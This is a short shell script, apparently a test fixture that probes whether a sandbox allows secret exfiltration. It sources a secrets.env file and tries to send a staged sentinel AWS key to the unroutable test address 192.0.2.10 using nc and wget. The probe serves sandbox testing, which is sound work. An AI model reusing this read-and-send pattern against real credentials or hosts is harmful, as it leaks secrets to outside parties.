#!/bin/sh
# Deterministic exfil-probe (v1) for the deploy-key-in-readme fixture. Reads the
# injected sentinel (staged by `--secret SENTINEL_AWS_KEY`) and attempts to send
# it to the marked RFC-5737 endpoint 192.0.2.10. TEST-NET, unroutable.
set -u
[ -f /run/rooms/secrets.env ] && . /run/rooms/secrets.env
timeout 8 sh -c \
  "nc -z -w4 192.0.2.10 80 || wget -q -T4 -O- 'http://192.0.2.10/collect?k=${SENTINEL_AWS_KEY:-unset}'" \
  || true
